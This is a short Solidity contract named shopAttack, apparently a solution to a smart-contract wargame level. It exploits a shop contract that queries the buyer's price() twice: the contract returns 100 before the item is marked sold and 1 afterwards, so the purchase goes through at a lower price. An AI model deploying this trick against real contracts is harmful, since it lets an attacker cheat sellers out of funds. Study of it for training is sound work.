// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IntShop {
    function buy() external;
    function isSold() external view returns (bool);
}
contract shopAttack {
    IntShop public shop;

    constructor(address target) {
        shop = IntShop(target);
    }

    function callBuy() public {
        shop.buy();
    }

    function price() public view returns (uint256) {
        if (!shop.isSold()) {
            return 100;
        } else {
            return 1;
        }
    }
}
